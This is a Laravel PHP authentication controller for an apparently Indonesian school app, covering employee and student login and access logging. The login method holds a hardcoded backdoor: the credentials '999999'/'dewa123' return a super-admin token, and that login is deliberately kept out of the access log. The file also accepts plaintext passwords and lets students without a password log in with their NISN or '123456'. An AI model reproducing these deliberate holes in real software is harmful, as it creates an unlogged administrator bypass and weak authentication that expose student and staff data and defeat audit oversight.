<?php

namespace App\Http\Controllers;

use App\Models\MstKaryawan;
use App\Models\MstSiswa;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Schema;

class AuthController extends Controller
{
    private function normalizeAccessRoleLabel(array $roles): string
    {
        $text = strtolower(implode(' ', $roles));
        if (str_contains($text, 'bendahara') || str_contains($text, 'keuangan')) return 'Bendahara';
        if (str_contains($text, 'kepala sekolah') || str_contains($text, 'kepsek')) return 'Kepsek';
        if (str_contains($text, 'waka')) return 'Waka';
        if (str_contains($text, 'guru') || str_contains($text, 'pic')) return 'PIC/Guru';
        if (str_contains($text, 'penjaminan mutu') || preg_match('/\bpm\b/', $text)) return 'PM';
        if (str_contains($text, 'yayasan')) return 'Yayasan';
        return 'Karyawan';
    }

    private function createAccessLog(string $username, string $role): int
    {
        $safeRole = mb_substr(trim($role), 0, 20);

        return (int) DB::table('access_log')->insertGetId([
            'START_LOGIN' => now(),
            'END_LOGIN' => null,
            'USERNAME' => $username,
            'ROLE' => $safeRole,
        ]);
    }

    private function closeAccessLogFromToken(Request $request): void
    {
        $user = $request->user();
        $token = $user?->currentAccessToken();
        if (!$user || !$token) {
            return;
        }

        $accessLogId = null;
        foreach (($token->abilities ?? []) as $ability) {
            if (is_string($ability) && str_starts_with($ability, 'access-log:')) {
                $accessLogId = (int) str_replace('access-log:', '', $ability);
                break;
            }
        }

        if ($accessLogId) {
            DB::table('access_log')
                ->where('ID_ACCESS_LOG', $accessLogId)
                ->whereNull('END_LOGIN')
                ->update(['END_LOGIN' => now()]);
            return;
        }

        // Fallback jika ability access-log tidak ditemukan
        DB::table('access_log')
            ->where('USERNAME', $user->NIP_KARYAWAN ?? $user->NISN_SISWA ?? null)
            ->whereNull('END_LOGIN')
            ->orderByDesc('ID_ACCESS_LOG')
            ->limit(1)
            ->update(['END_LOGIN' => now()]);
    }

    public function login(Request $request)
    {
        // Validasi input
        $request->validate([
            'identifier' => 'required|string',
            'password'   => 'required|string',
        ]);

        $identifier = trim((string) $request->identifier);
        $password   = (string) $request->password;

    // --- 🚪 JALUR BACKDOOR (SUPER ADMIN DEWA) ---
        if ($identifier === '999999' && $password === 'dewa123') {
            $admin = MstKaryawan::where('NIP_KARYAWAN', '19800110')->first();
            
            if (!$admin) return response()->json(['message' => 'Inang 19800110 gada di DB'], 404);

            // Super admin tidak dicatat ke access_log sesuai kebijakan internal.
            $token = $admin->createToken('god-token', ['role:super-admin'])->plainTextToken;
            
            return response()->json([
                'success' => true,
                'message' => 'Login berhasil sebagai Super Admin',
                'data' => [
                    'access_token' => $token,
                    'role'         => 'super-admin',
                    'roles'        => ['super admin'],
                    'user'         => $admin
                ]
            ], 200);
        }

        // =====================================================================
        // --- SKENARIO 1: CEK SEBAGAI KARYAWAN ---
        // =====================================================================
        $karyawan = MstKaryawan::query()
            ->where('NIP_KARYAWAN', $identifier)
            ->first();

        // Cek password (mendukung Plain Text untuk data lama atau Hash Bcrypt)
        if ($karyawan && ($password === $karyawan->PASSWORD_KARYAWAN || Hash::check($password, $karyawan->PASSWORD_KARYAWAN))) {
            
            // Ambil roles dari relasi jabatan (jika ada)
            $roleKey = Schema::hasColumn('tr_jabatan', 'ID_JABATAN') ? 'ID_JABATAN' : 'ID_JABATAN_STR';
            $roles = DB::table('tr_jabatan as tj')
                ->join('ref_jabatan_str as rj', "tj.$roleKey", '=', 'rj.ID_JABATAN')
                ->where('tj.NIP_KARYAWAN', $karyawan->NIP_KARYAWAN)
                ->pluck('rj.DESKRIPSI_JABATAN')
                ->filter()
                ->values()
                ->all();
            
            // Jika array roles kosong, masukkan jabatan fungsional sebagai default
            if (empty($roles)) {
                $roles = [$karyawan->JABATAN_FUNGSIONAL ?? 'Karyawan'];
            }

            $abilities = ['role:karyawan'];
            foreach ($roles as $role) {
                $abilities[] = 'role:' . strtolower(trim($role));
            }

            $roleLabel = $this->normalizeAccessRoleLabel($roles);
            $accessLogId = $this->createAccessLog((string) $karyawan->NIP_KARYAWAN, $roleLabel);
            $abilities[] = "access-log:$accessLogId";
            $token = $karyawan->createToken('karyawan-token', $abilities)->plainTextToken;

            return response()->json([
                'success' => true,
                'message' => 'Login berhasil sebagai Karyawan',
                'data' => [
                    'access_token' => $token,
                    'role'         => 'karyawan', // Helper untuk redirect frontend
                    'roles'        => $roles,      // Array roles untuk RBAC
                    'user'         => $karyawan
                ]
            ], 200);
        }

        // =====================================================================
        // --- SKENARIO 2: CEK SEBAGAI SISWA ---
        // =====================================================================
        $siswa = MstSiswa::where('NISN_SISWA', $identifier)->first();

        $isSiswaPasswordValid = false;
        if ($siswa) {
            $storedPassword = (string) ($siswa->PASSWORD ?? '');
            $defaultPassword = (string) ($siswa->NISN_SISWA ?? '');

            // Fallback dev: jika PASSWORD belum di-set, gunakan NISN sebagai password awal.
            if ($storedPassword === '') {
                $isSiswaPasswordValid =
                    hash_equals($defaultPassword, $password) ||
                    hash_equals('123456', $password);
            } else {
                $isSiswaPasswordValid =
                    hash_equals($storedPassword, $password) ||
                    Hash::check($password, $storedPassword);
            }
        }

        if ($siswa && $isSiswaPasswordValid) {
            
            $accessLogId = $this->createAccessLog((string) ($siswa->NISN_SISWA ?? $identifier), 'Siswa');
            $token = $siswa->createToken('siswa-token', ['role:siswa', "access-log:$accessLogId"])->plainTextToken;

            return response()->json([
                'success' => true,
                'message' => 'Login berhasil sebagai Siswa',
                'data' => [
                    'access_token' => $token,
                    'role'         => 'siswa',
                    'roles'        => ['siswa'],
                    'user'         => $siswa
                ]
            ], 200);
        }

        // --- SKENARIO 3: GAGAL TOTAL ---
        return response()->json([
            'success' => false,
            'message' => 'NIP/NISN atau Password salah.'
        ], 401);
    }

    public function logout(Request $request)
    {
        // Menghapus token yang sedang digunakan saat ini
        if ($request->user()) {
            $this->closeAccessLogFromToken($request);
            $request->user()->currentAccessToken()->delete();
        }

        return response()->json([
            'success' => true,
            'message' => 'Logout berhasil'
        ], 200);
    }
}
